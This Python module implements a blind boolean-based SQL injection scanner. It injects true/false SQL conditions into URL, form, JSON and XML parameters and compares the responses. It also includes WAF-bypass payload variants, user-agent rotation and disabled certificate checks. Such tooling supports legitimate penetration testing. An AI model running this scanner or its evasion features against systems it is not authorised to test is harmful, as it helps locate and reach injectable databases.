# boolean_based.py
# Advanced boolean-based blind SQLi detector with multiple detection modes

import time
import requests
import urllib3
import random
import statistics
import math
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Tuple, Optional, Union, Any
import json
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import logging
from datetime import datetime
import hashlib

# Import your modules
from user_agents import AdvancedUserAgentRotator
from payload_generator import BasicDetectionPayloads, AdvancedDetectionPayloads, EnhancedPayloadGenerator
from bypass import AdvancedWAFBypass, SmartWAFBypass, generate_smart_bypass_payloads

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration / constants ------------------------------------------------
DEFAULT_SAMPLE_SIZE = 5
DEFAULT_CONFIDENCE_THRESHOLD = 0.85
MAX_PARALLEL_PAYLOADS = 6
DEFAULT_DELAY = 0.5

# Detection modes
DETECTION_MODES = {
    'basic': 'BasicDetectionPayloads only',
    'basic_bypass': 'BasicDetectionPayloads + WAF bypass',
    'advanced': 'AdvancedDetectionPayloads only', 
    'advanced_bypass': 'AdvancedDetectionPayloads + WAF bypass'
}

# Boolean-based detection patterns
BOOLEAN_PATTERNS = {
    'true_conditions': [
        "1=1", "2=2", "1=1", "'a'='a'", "1", "true",
        "@@version=@@version", "database()=database()",
        "ASCII('A')=65", "LENGTH('test')=4"
    ],
    'false_conditions': [
        "1=2", "2=1", "1=0", "'a'='b'", "0", "false",
        "@@version=@@version1", "database()=wrong",
        "ASCII('A')=66", "LENGTH('test')=5"
    ]
}

# --- Helper utilities --------------------------------------------------------
def calculate_similarity(response1: str, response2: str) -> float:
    """Calculate similarity between two responses using multiple methods."""
    if response1 == response2:
        return 1.0
    
    # Length-based similarity
    len1, len2 = len(response1), len(response2)
    length_similarity = 1.0 - abs(len1 - len2) / max(len1, len2, 1)
    
    # Content-based similarity (simple character matching)
    common_chars = sum(1 for a, b in zip(response1, response2) if a == b)
    max_len = max(len(response1), len(response2))
    content_similarity = common_chars / max_len if max_len > 0 else 0
    
    # Hash-based similarity for quick comparison
    hash1 = hashlib.md5(response1.encode()).hexdigest()
    hash2 = hashlib.md5(response2.encode()).hexdigest()
    hash_similarity = 1.0 if hash1 == hash2 else 0.7 if hash1[:8] == hash2[:8] else 0.3
    
    # Weighted combination
    similarity = (length_similarity * 0.3 + content_similarity * 0.4 + hash_similarity * 0.3)
    
    return similarity

def analyze_response_patterns(responses: List[str]) -> Dict[str, Any]:
    """Analyze response patterns for boolean-based detection."""
    if not responses or len(responses) < 2:
        return {'confidence': 0.0, 'pattern_detected': False, 'variation_score': 0.0}
    
    # Calculate pairwise similarities
    similarities = []
    for i in range(len(responses)):
        for j in range(i + 1, len(responses)):
            sim = calculate_similarity(responses[i], responses[j])
            similarities.append(sim)
    
    avg_similarity = statistics.mean(similarities) if similarities else 0
    std_similarity = statistics.stdev(similarities) if len(similarities) > 1 else 0
    
    # Pattern detection logic
    pattern_detected = std_similarity < 0.1 and avg_similarity > 0.8  # Consistent responses
    variation_detected = std_similarity > 0.3 and avg_similarity < 0.6  # Varying responses
    
    confidence = 0.0
    if pattern_detected:
        confidence = min(1.0, avg_similarity * 1.2)
    elif variation_detected:
        confidence = min(1.0, (1 - avg_similarity) * 1.5)
    
    return {
        'confidence': confidence,
        'pattern_detected': pattern_detected,
        'variation_detected': variation_detected,
        'avg_similarity': avg_similarity,
        'std_similarity': std_similarity,
        'response_count': len(responses)
    }

# --- Enhanced HTTP Session ---------------------------------------------------
class ResilientHTTPSession:
    """HTTP session with retry logic and connection pooling."""
    
    def __init__(self, max_retries: int = 3, backoff_factor: float = 0.5):
        self.session = requests.Session()
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self._setup_session()
    
    def _setup_session(self):
        """Configure session with retry strategy."""
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=self.backoff_factor,
            status_forcelist=[429, 500, 502, 503, 504, 403],
            allowed_methods=["GET", "POST"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Default headers
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make HTTP request with enhanced error handling."""
        # Ensure verify=False for SSL
        kwargs['verify'] = False
        kwargs['timeout'] = kwargs.get('timeout', 30)
        kwargs['allow_redirects'] = kwargs.get('allow_redirects', False)
        
        return self.session.request(method, url, **kwargs)
    
    def close(self):
        """Close session."""
        self.session.close()

# --- Main Detector -----------------------------------------------------------
class AdvancedBooleanBasedDetector:
    """
    Enhanced Boolean-Based Blind SQL Injection Detector with multiple detection modes.
    """

    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.sample_size = self.config.get('sample_size', DEFAULT_SAMPLE_SIZE)
        self.confidence_threshold = self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD)
        self.max_response_time = self.config.get('max_response_time', 30)
        self.max_payloads_per_param = self.config.get('max_payloads_per_param', 20)
        self.detection_mode = self.config.get('detection_mode', 'advanced_bypass')
        self.use_smart_bypass = self.config.get('use_smart_bypass', False)
        self.payloads_directory = self.config.get('payloads_directory', 'payloads')
        self.delay = self.config.get('delay', DEFAULT_DELAY)

        # Initialize components based on detection mode
        self._initialize_components()
        
        # HTTP session
        self.http_session = ResilientHTTPSession(
            max_retries=self.config.get('max_retries', 3),
            backoff_factor=self.config.get('backoff_factor', 0.5)
        )

        # Internal state
        self.request_history: List[Dict[str, Any]] = []
        self.baseline_responses: List[str] = []
        self.true_responses: List[str] = []
        self.false_responses: List[str] = []
        self.learning_data = []

        # Logging
        self.logger = self._setup_logging()
        self.logger.info(f"Initialized boolean-based detector with mode: {self.detection_mode}")

    def _initialize_components(self):
        """Initialize detection components based on selected mode."""
        # Always initialize these
        self.ua_rotator = AdvancedUserAgentRotator()
        self.waf_bypass = AdvancedWAFBypass()
        self.smart_bypass = SmartWAFBypass() if self.use_smart_bypass else None
        
        # Initialize payload sources based on mode
        if self.detection_mode in ['basic', 'basic_bypass']:
            self.payload_source = BasicDetectionPayloads()
            self.advanced_payloads = None
            self.payload_generator = None
        else:
            self.payload_source = BasicDetectionPayloads()  # Fallback
            self.advanced_payloads = AdvancedDetectionPayloads(self.payloads_directory)
            self.payload_generator = EnhancedPayloadGenerator(
                use_bypass=(self.detection_mode == 'advanced_bypass'),
                payloads_directory=self.payloads_directory,
                smart_learning=self.use_smart_bypass
            )

    def _setup_logging(self):
        logger = logging.getLogger('AdvancedBooleanBasedDetector')
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

    # ----------------- Enhanced Payload Management -------------------
    def _collect_boolean_payloads(self, db_hint: str = 'auto') -> List[Dict[str, Any]]:
        """
        Collect boolean-based payloads based on detection mode.
        """
        payloads = []
        
        if self.detection_mode in ['basic', 'basic_bypass']:
            payloads = self._get_basic_boolean_payloads(db_hint)
        else:
            payloads = self._get_advanced_boolean_payloads(db_hint)
        
        # Apply bypass if enabled in mode
        if self.detection_mode in ['basic_bypass', 'advanced_bypass']:
            payloads = self._apply_bypass_to_payloads(payloads)
        
        return payloads[:self.max_payloads_per_param]

    def _get_basic_boolean_payloads(self, db_hint: str) -> List[Dict[str, Any]]:
        """Get boolean-based payloads from BasicDetectionPayloads."""
        payloads = []
        pb = self.payload_source
        all_payloads = pb.get_all_payloads()
        
        # Get boolean blind payloads
        boolean_payloads = all_payloads.get('boolean_blind', {})
        
        # Process database-specific payloads
        db_priority = ['mysql', 'postgresql', 'mssql', 'oracle', 'sqlite']
        if db_hint != 'auto' and db_hint in db_priority:
            db_priority = [db_hint] + [db for db in db_priority if db != db_hint]
        
        for db_type in db_priority:
            db_payloads = boolean_payloads.get(f'{db_type}_boolean', [])
            for p in db_payloads:
                processed = self._process_payload_template(p, db_type)
                if processed:
                    payloads.append({
                        'payload': processed,
                        'db': db_type,
                        'base_confidence': 0.8,
                        'description': f"{db_type} boolean-based",
                        'payload_type': 'complex',
                        'source': 'basic'
                    })
        
        # Add simple true/false conditions
        for condition in BOOLEAN_PATTERNS['true_conditions'][:5]:
            payloads.append({
                'payload': f"' AND {condition}--",
                'db': 'generic',
                'base_confidence': 0.7,
                'description': "Simple true condition",
                'payload_type': 'true',
                'source': 'basic'
            })
        
        for condition in BOOLEAN_PATTERNS['false_conditions'][:5]:
            payloads.append({
                'payload': f"' AND {condition}--",
                'db': 'generic',
                'base_confidence': 0.7,
                'description': "Simple false condition",
                'payload_type': 'false',
                'source': 'basic'
            })
        
        return payloads

    def _get_advanced_boolean_payloads(self, db_hint: str) -> List[Dict[str, Any]]:
        """Get boolean-based payloads from AdvancedDetectionPayloads."""
        payloads = []
        
        if not self.advanced_payloads:
            return self._get_basic_boolean_payloads(db_hint)
        
        # Get payloads by database type
        if db_hint != 'auto':
            db_payloads = self.advanced_payloads.get_payloads_by_database(db_hint)
        else:
            # Get all boolean-based payloads
            db_payloads = self.advanced_payloads.get_payloads_by_attack_type('blind')
        
        # Flatten and process payloads
        for category, payload_list in db_payloads.items():
            for p in payload_list:
                if any(keyword in p.lower() for keyword in ['ascii', 'substring', 'length', 'exists', 'like', '=']):
                    processed = self._process_payload_template(p, db_hint)
                    if processed:
                        payload_type = 'true' if '1=1' in p or 'true' in p.lower() else 'false' if '1=2' in p or 'false' in p.lower() else 'complex'
                        payloads.append({
                            'payload': processed,
                            'db': db_hint,
                            'base_confidence': 0.85,
                            'description': f"Advanced {category}",
                            'payload_type': payload_type,
                            'source': 'advanced'
                        })
        
        # Add basic payloads as fallback
        if not payloads:
            payloads = self._get_basic_boolean_payloads(db_hint)
        
        return payloads

    def _apply_bypass_to_payloads(self, original_payloads: List[Dict]) -> List[Dict]:
        """Apply WAF bypass techniques to payloads."""
        bypassed_payloads = []
        
        for original in original_payloads[:12]:  # Limit for performance
            raw_payload = original['payload']
            
            # Apply smart bypass if enabled
            if self.use_smart_bypass and self.smart_bypass:
                try:
                    smart_variants = self.smart_bypass.get_optimized_bypass(raw_payload, self.waf_bypass)
                    for variant in smart_variants[:2]:
                        bypassed_payloads.append({
                            'payload': variant,
                            'db': original['db'],
                            'base_confidence': original['base_confidence'] * 0.95,
                            'description': original['description'] + ' (smart bypass)',
                            'payload_type': original.get('payload_type', 'complex'),
                            'source': original['source'] + '_bypass'
                        })
                except Exception as e:
                    self.logger.debug(f"Smart bypass failed: {e}")
            
            # Apply standard bypass techniques
            try:
                bypass_variants = self.waf_bypass.apply_all_bypasses(raw_payload, max_variations=2)
                for variant in bypass_variants:
                    if variant not in [p['payload'] for p in bypassed_payloads]:
                        bypassed_payloads.append({
                            'payload': variant,
                            'db': original['db'],
                            'base_confidence': original['base_confidence'] * 0.9,
                            'description': original['description'] + ' (bypass)',
                            'payload_type': original.get('payload_type', 'complex'),
                            'source': original['source'] + '_bypass'
                        })
            except Exception as e:
                self.logger.debug(f"Standard bypass failed: {e}")
        
        # Combine original and bypassed payloads
        all_payloads = original_payloads + bypassed_payloads
        
        # Deduplicate
        seen = set()
        deduped = []
        for pl in all_payloads:
            if pl['payload'] not in seen:
                deduped.append(pl)
                seen.add(pl['payload'])
        
        return deduped

    def _process_payload_template(self, payload: str, db_type: str) -> str:
        """Process payload templates with actual values."""
        processed = payload
        
        replacements = {
            '[RANDNUM]': str(random.randint(1000, 9999)),
            '[RANDSTR]': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
        }
        
        for placeholder, value in replacements.items():
            processed = processed.replace(placeholder, value)
            
        return processed

    # ----------------- Baseline Measurement -------------------
    def calculate_baseline(self, url: str, method: str = 'GET', headers: Dict = None, 
                         data: Dict = None, cookies: Dict = None, samples: int = 5) -> List[str]:
        """Measure baseline responses."""
        self.logger.info(f"Calculating baseline with {samples} samples for {url}")
        baseline_responses = []
        headers = self._prepare_headers(headers)
        
        for i in range(samples):
            try:
                ok, response_text, sc, _ = self._send_request(url, method, headers=headers, 
                                                             data=data, cookies=cookies, safe_mode=True)
                if ok and sc == 200:
                    baseline_responses.append(response_text)
                time.sleep(self.delay + random.random() * 0.3)
            except Exception as e:
                self.logger.debug(f"Baseline request {i+1} failed: {e}")
                continue

        self.baseline_responses = baseline_responses
        self.logger.info(f"Baseline established: {len(baseline_responses)} samples")
        
        return baseline_responses

    def calculate_boolean_baseline(self, url: str, method: str = 'GET', headers: Dict = None, 
                                 data: Dict = None, cookies: Dict = None, parameter: str = None) -> Dict[str, Any]:
        """Calculate baseline for true and false conditions."""
        self.logger.info("Calculating boolean baseline with true/false conditions")
        
        true_responses = []
        false_responses = []
        
        # Test simple true conditions
        for condition in BOOLEAN_PATTERNS['true_conditions'][:3]:
            test_payload = f"' AND {condition}--"
            ok, response, sc, _ = self._send_parameter_payload(url, method, headers, data, cookies, parameter, test_payload)
            if ok and sc == 200:
                true_responses.append(response)
            time.sleep(self.delay)
        
        # Test simple false conditions
        for condition in BOOLEAN_PATTERNS['false_conditions'][:3]:
            test_payload = f"' AND {condition}--"
            ok, response, sc, _ = self._send_parameter_payload(url, method, headers, data, cookies, parameter, test_payload)
            if ok and sc == 200:
                false_responses.append(response)
            time.sleep(self.delay)
        
        self.true_responses = true_responses
        self.false_responses = false_responses
        
        baseline_analysis = {
            'true_responses': true_responses,
            'false_responses': false_responses,
            'true_count': len(true_responses),
            'false_count': len(false_responses),
            'different_responses': len(true_responses) > 0 and len(false_responses) > 0 and 
                                 calculate_similarity(
                                     statistics.mode(true_responses) if true_responses else "",
                                     statistics.mode(false_responses) if false_responses else ""
                                 ) < 0.8
        }
        
        self.logger.info(f"Boolean baseline: {baseline_analysis['true_count']} true, {baseline_analysis['false_count']} false, different: {baseline_analysis['different_responses']}")
        
        return baseline_analysis

    # ----------------- HTTP Communication -------------------
    def _prepare_headers(self, headers: Optional[Dict[str,str]] = None) -> Dict[str,str]:
        """Prepare headers with User-Agent rotation."""
        headers = (headers or {}).copy()
        if 'User-Agent' not in headers:
            ua = self.ua_rotator.get_user_agent()
            headers['User-Agent'] = ua
        return headers

    def _send_request(self, url: str, method: str = 'GET', headers: Dict = None, 
                     data: Any = None, cookies: Dict = None, safe_mode: bool = False, 
                     timeout: Optional[int] = None) -> Tuple[bool, str, int, str]:
        """Send HTTP request with comprehensive error handling."""
        if timeout is None:
            timeout = self.max_response_time

        headers = self._prepare_headers(headers)
        cookies = cookies or {}
        start = time.time()

        try:
            if method.upper() == 'GET':
                resp = self.http_session.request('GET', url, headers=headers, cookies=cookies, timeout=timeout)
            elif method.upper() == 'POST':
                ct = headers.get('Content-Type', '')
                if 'application/json' in ct and isinstance(data, (dict, list)):
                    payload = json.dumps(data)
                    resp = self.http_session.request('POST', url, headers=headers, cookies=cookies, data=payload, timeout=timeout)
                else:
                    resp = self.http_session.request('POST', url, headers=headers, cookies=cookies, data=data, timeout=timeout)
            else:
                resp = self.http_session.request(method, url, headers=headers, cookies=cookies, data=data, timeout=timeout)

            response_text = resp.text
            rt = time.time() - start
            
            if not safe_mode:
                self.request_history.append({
                    'timestamp': datetime.now(),
                    'response_time': rt,
                    'status_code': resp.status_code,
                    'url': url
                })
                
                # Collect learning data for smart bypass
                if self.use_smart_bypass:
                    self.learning_data.append((url, resp.status_code, resp.text))

            return True, response_text, resp.status_code, resp.headers.get('Content-Type', '')
            
        except requests.exceptions.Timeout:
            rt = time.time() - start
            self.logger.debug(f"Request timeout after {rt:.2f}s: {url}")
            return False, "Timeout", 0, ""
        except requests.RequestException as e:
            rt = time.time() - start
            self.logger.debug(f"Request failed: {e}")
            return False, str(e), 0, ""
        except Exception as e:
            rt = time.time() - start
            self.logger.debug(f"Unexpected error: {e}")
            return False, str(e), 0, ""

    def _send_parameter_payload(self, url: str, method: str, headers: Dict, data: Any, 
                              cookies: Dict, parameter: str, payload: str) -> Tuple[bool, str, int, str]:
        """Send request with specific parameter payload."""
        test_url, test_method, test_headers, test_data = self._build_test_request(
            url, method, headers, data, parameter, payload
        )
        return self._send_request(test_url, test_method, test_headers, test_data, cookies)

    # ----------------- Injection Helpers -------------------
    def _inject_into_structure(self, data_structure: Any, key: str, value: str):
        """Recursively inject payload into data structures."""
        if isinstance(data_structure, dict):
            for k, v in list(data_structure.items()):
                if k == key:
                    data_structure[k] = value
                else:
                    self._inject_into_structure(v, key, value)
        elif isinstance(data_structure, list):
            for i, item in enumerate(data_structure):
                if isinstance(item, (dict, list)):
                    self._inject_into_structure(item, key, value)

    def _inject_into_xml(self, xml_data: str, element: str, value: str) -> str:
        """Inject payload into XML data."""
        try:
            root = ET.fromstring(xml_data)
            for elem in root.iter(element):
                elem.text = value
            return ET.tostring(root, encoding='unicode')
        except Exception:
            return xml_data.replace(f"<{element}>", f"<{element}>{value}")

    def _build_test_request(self, url: str, method: str, headers: Dict, 
                          data: Any, parameter: str, payload: str) -> Tuple[str, str, Dict, Any]:
        """Build test request with injected payload."""
        test_url = url
        test_method = method
        test_headers = headers.copy()
        test_data = data.copy() if hasattr(data, 'copy') else data

        if method.upper() == 'GET':
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            query_params[parameter] = [payload]
            new_query = urlencode(query_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            content_type = test_headers.get('Content-Type', '')
            
            if 'application/json' in content_type:
                if isinstance(test_data, str):
                    try:
                        json_data = json.loads(test_data)
                        self._inject_into_structure(json_data, parameter, payload)
                        test_data = json.dumps(json_data)
                    except json.JSONDecodeError:
                        test_data = test_data.replace(f'"{parameter}"', f'"{payload}"')
                else:
                    self._inject_into_structure(test_data, parameter, payload)
                    
            elif 'xml' in content_type and isinstance(test_data, str):
                test_data = self._inject_into_xml(test_data, parameter, payload)
                
            elif isinstance(test_data, dict):
                test_data[parameter] = payload
                
            elif isinstance(test_data, str):
                test_data = test_data.replace(f"{parameter}=", f"{parameter}={payload}")

        return test_url, test_method, test_headers, test_data

    # ----------------- Boolean Analysis -------------------
    def analyze_boolean_pattern(self, payload_responses: List[str], baseline_responses: List[str], 
                              payload_type: str = 'complex') -> Dict[str, Any]:
        """Analyze boolean pattern in responses."""
        if not payload_responses:
            return {'confidence': 0.0, 'pattern_detected': False, 'consistency': 0.0}
        
        # Analyze response patterns for this payload
        payload_analysis = analyze_response_patterns(payload_responses)
        
        # Compare with baseline
        baseline_analysis = analyze_response_patterns(baseline_responses) if baseline_responses else {'avg_similarity': 0}
        
        # Calculate difference from baseline
        baseline_diff = 1.0 - payload_analysis['avg_similarity'] / max(baseline_analysis['avg_similarity'], 0.1)
        
        confidence = 0.0
        
        # Different response patterns indicate boolean-based injection
        if payload_analysis['pattern_detected'] and baseline_diff > 0.3:
            confidence = min(1.0, baseline_diff * 1.5)
        
        # Consistent different responses also indicate injection
        elif payload_analysis['variation_detected'] and baseline_diff > 0.2:
            confidence = min(1.0, (1 - payload_analysis['avg_similarity']) * 1.2)
        
        # For true/false payloads, look for specific patterns
        if payload_type in ['true', 'false'] and len(payload_responses) >= 3:
            response_consistency = payload_analysis['avg_similarity']
            if response_consistency > 0.9:
                confidence = max(confidence, 0.8)
        
        return {
            'confidence': confidence,
            'pattern_detected': payload_analysis['pattern_detected'],
            'variation_detected': payload_analysis['variation_detected'],
            'response_consistency': payload_analysis['avg_similarity'],
            'baseline_difference': baseline_diff,
            'response_count': len(payload_responses)
        }

    # ----------------- Core Testing Logic -------------------
    def _test_single_payload(self, test_url: str, method: str, headers: Dict, 
                           data: Any, cookies: Dict, payload_info: Dict) -> Dict[str, Any]:
        """Test a single boolean payload with multiple samples."""
        payload = payload_info['payload']
        payload_responses = []
        response_times = []
        
        for i in range(self.sample_size):
            try:
                start = time.time()
                ok, response_text, sc, content_type = self._send_request(
                    test_url, method, headers=headers, data=data, cookies=cookies
                )
                rt = time.time() - start
                response_times.append(rt)
                
                if ok and sc == 200:  # Only analyze successful requests
                    payload_responses.append(response_text)
                
                time.sleep(self.delay + random.random() * 0.2)
            except Exception as e:
                self.logger.debug(f"Test request {i+1} failed: {e}")
                continue

        # Analyze boolean pattern
        boolean_analysis = self.analyze_boolean_pattern(
            payload_responses, 
            self.baseline_responses,
            payload_info.get('payload_type', 'complex')
        )
        
        return {
            'payload': payload,
            'payload_info': payload_info,
            'payload_responses': payload_responses,
            'response_times': response_times,
            'boolean_analysis': boolean_analysis,
            'successful_samples': len(payload_responses)
        }

    def test_parameter(self, url: str, parameter: str, value: str = 'test', 
                     method: str = 'GET', headers: Dict = None, data: Any = None, 
                     cookies: Dict = None, database_type: str = 'auto') -> Dict[str, Any]:
        """Test a specific parameter for boolean-based SQL injection."""
        self.logger.info(f"Testing parameter '{parameter}' with mode: {self.detection_mode}")
        
        headers = self._prepare_headers(headers)
        cookies = cookies or {}
        original_data = data.copy() if hasattr(data, 'copy') else data

        # Calculate baseline if not done
        if not self.baseline_responses:
            self.calculate_baseline(url, method, headers, original_data, cookies)
        
        # Calculate boolean baseline
        boolean_baseline = self.calculate_boolean_baseline(url, method, headers, original_data, cookies, parameter)

        # Get payloads based on detection mode
        all_payloads = self._collect_boolean_payloads(database_type)
        
        self.logger.info(f"Testing {len(all_payloads)} boolean payload variants for parameter '{parameter}'")

        results_details = []
        vulnerable_payloads = []

        # Test payloads with threading
        with ThreadPoolExecutor(max_workers=min(MAX_PARALLEL_PAYLOADS, len(all_payloads) or 1)) as executor:
            future_to_payload = {}
            
            for pl in all_payloads:
                test_url, test_method, test_headers, test_data = self._build_test_request(
                    url, method, headers, original_data, parameter, pl['payload']
                )
                
                future = executor.submit(
                    self._test_single_payload, test_url, test_method, test_headers, 
                    test_data, cookies, pl
                )
                future_to_payload[future] = pl

            for future in as_completed(future_to_payload):
                pl = future_to_payload[future]
                try:
                    result = future.result()
                    analysis = result['boolean_analysis']
                    
                    combined_conf = analysis['confidence'] * pl['base_confidence']
                    
                    # Boost confidence if we have clear true/false differentiation
                    if boolean_baseline['different_responses'] and analysis['confidence'] > 0.5:
                        combined_conf = min(1.0, combined_conf * 1.2)
                    
                    result_entry = {
                        'payload': pl['payload'],
                        'database_type': pl['db'],
                        'description': pl.get('description', ''),
                        'payload_type': pl.get('payload_type', 'complex'),
                        'boolean_analysis': analysis,
                        'response_samples': result['successful_samples'],
                        'combined_confidence': combined_conf,
                        'detection_mode': self.detection_mode,
                        'vulnerable': False
                    }

                    if (combined_conf >= self.confidence_threshold and 
                        result['successful_samples'] >= max(3, int(self.sample_size * 0.6))):
                        result_entry['vulnerable'] = True
                        vulnerable_payloads.append(result_entry)

                    results_details.append(result_entry)
                    
                    self.logger.info(
                        f"Payload tested: conf={analysis['confidence']:.3f}, "
                        f"combined={combined_conf:.3f}, vulnerable={result_entry['vulnerable']}"
                    )
                    
                except Exception as e:
                    self.logger.error(f"Error testing payload: {e}")

        # Compile final results
        overall_confidence = max((v['combined_confidence'] for v in vulnerable_payloads), default=0.0)
        
        return {
            'parameter': parameter,
            'database_type': database_type,
            'vulnerable': len(vulnerable_payloads) > 0,
            'confidence': overall_confidence,
            'payloads_tested': len(results_details),
            'successful_payloads': vulnerable_payloads,
            'boolean_baseline': boolean_baseline,
            'detection_mode': self.detection_mode,
            'details': results_details
        }

    # ----------------- Scanning Methods -------------------
    def _extract_parameters(self, target: Dict[str, Any]) -> List[str]:
        """Extract all parameters from target configuration."""
        params = []
        
        parsed = urlparse(target['url'])
        params.extend(parse_qs(parsed.query).keys())
        
        if target.get('method', 'GET').upper() == 'POST':
            data = target.get('data')
            if isinstance(data, dict):
                params.extend(data.keys())
            elif isinstance(data, str):
                try:
                    json_data = json.loads(data)
                    if isinstance(json_data, dict):
                        params.extend(json_data.keys())
                except json.JSONDecodeError:
                    params.extend(parse_qs(data).keys())
        
        return list(dict.fromkeys(params))

    def comprehensive_scan(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """Perform comprehensive boolean-based SQL injection scan."""
        self.logger.info(f"Starting comprehensive boolean-based scan for {target.get('url')} with mode: {self.detection_mode}")
        
        if not self.baseline_responses:
            self.calculate_baseline(
                target['url'], 
                target.get('method', 'GET'), 
                target.get('headers'), 
                target.get('data'), 
                target.get('cookies')
            )

        parameters = self._extract_parameters(target)
        scan_start = datetime.now()
        
        results = {
            'target': target,
            'detection_mode': self.detection_mode,
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'scan_start': scan_start
        }

        for param in parameters:
            self.logger.info(f"Testing parameter: {param}")
            
            param_result = self.test_parameter(
                target['url'], param,
                value=(target.get('data') or {}).get(param, 'test'),
                method=target.get('method', 'GET'),
                headers=target.get('headers'),
                data=target.get('data'),
                cookies=target.get('cookies'),
                database_type=target.get('database_type', 'auto')
            )
            
            results['parameters_tested'].append(param_result)
            
            if param_result['vulnerable']:
                results['vulnerable_parameters'].append(param_result)

        results['scan_duration'] = (datetime.now() - scan_start).total_seconds()
        results['vulnerability_count'] = len(results['vulnerable_parameters'])
        
        self._generate_scan_summary(results)
        return results

    def adaptive_scan(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """Perform adaptive scan with quick first pass and deep follow-up."""
        self.logger.info(f"Starting adaptive boolean-based scan with mode: {self.detection_mode}")
        
        # Quick first pass
        original_sample_size = self.sample_size
        self.sample_size = max(3, self.sample_size // 2)
        
        quick_results = self.comprehensive_scan(target)
        
        # Restore original settings
        self.sample_size = original_sample_size

        if quick_results['vulnerability_count'] > 0:
            self.logger.info("Quick scan found potential vulnerabilities - performing deep verification")
            
            deep_results = {
                'target': target,
                'detection_mode': self.detection_mode,
                'parameters_tested': [],
                'vulnerable_parameters': []
            }
            
            for vuln_param in quick_results['vulnerable_parameters']:
                param_name = vuln_param['parameter']
                
                self.sample_size = min(8, self.sample_size * 2)
                
                try:
                    verified = self.test_parameter(
                        target['url'], param_name,
                        value=(target.get('data') or {}).get(param_name, 'test'),
                        method=target.get('method', 'GET'),
                        headers=target.get('headers'),
                        data=target.get('data'),
                        cookies=target.get('cookies'),
                        database_type='auto'
                    )
                    
                    deep_results['parameters_tested'].append(verified)
                    
                    if verified['vulnerable']:
                        deep_results['vulnerable_parameters'].append(verified)
                        
                finally:
                    self.sample_size = original_sample_size
            
            deep_results['vulnerability_count'] = len(deep_results['vulnerable_parameters'])
            return deep_results
        else:
            self.logger.info("No vulnerabilities found in quick scan - performing comprehensive scan")
            return self.comprehensive_scan(target)

    def _generate_scan_summary(self, scan_results: Dict[str, Any]):
        """Generate comprehensive scan summary."""
        self.logger.info("=" * 60)
        self.logger.info("BOOLEAN-BASED BLIND SQL INJECTION SCAN SUMMARY")
        self.logger.info(f"Target: {scan_results['target'].get('url')}")
        self.logger.info(f"Detection mode: {scan_results['detection_mode']}")
        self.logger.info(f"Parameters tested: {len(scan_results['parameters_tested'])}")
        self.logger.info(f"Vulnerabilities found: {scan_results['vulnerability_count']}")
        self.logger.info(f"Scan duration: {scan_results.get('scan_duration', 0):.2f}s")
        
        if scan_results['vulnerability_count'] > 0:
            self.logger.info("Vulnerable parameters:")
            for vuln in scan_results['vulnerable_parameters']:
                self.logger.info(f"  - {vuln['parameter']} (confidence: {vuln['confidence']:.3f})")
                if vuln.get('boolean_baseline', {}).get('different_responses'):
                    self.logger.info("    Clear true/false differentiation detected")
        
        self.logger.info("=" * 60)

    def close(self):
        """Clean up resources."""
        self.http_session.close()

# Convenience functions
def run_boolean_based_scan(target_config: Dict[str, Any], scan_type: str = 'comprehensive',
                          detector_config: Dict[str, Any] = None,
                          use_webdriver: bool = False,
                          custom_payloads: List[str] = None):

    enriched_target = target_config
    detector = AdvancedBooleanBasedDetector(detector_config or {})

    try:
        if scan_type == 'quick':
            detector.sample_size = 3
            return detector.adaptive_scan(enriched_target)

        elif scan_type == 'comprehensive':
            return detector.comprehensive_scan(enriched_target)

        elif scan_type == 'adaptive':
            return detector.adaptive_scan(enriched_target)

        else:
            raise ValueError(f"Unknown scan type: {scan_type}")

    finally:
        detector.close()

def get_detection_modes():
    """Get available detection modes."""
    return DETECTION_MODES

def analyze_response_differences(response1: str, response2: str) -> Dict[str, Any]:
    """Analyze differences between two responses."""
    return {
        'similarity': calculate_similarity(response1, response2),
        'length_difference': abs(len(response1) - len(response2)),
        'is_different': calculate_similarity(response1, response2) < 0.8
    }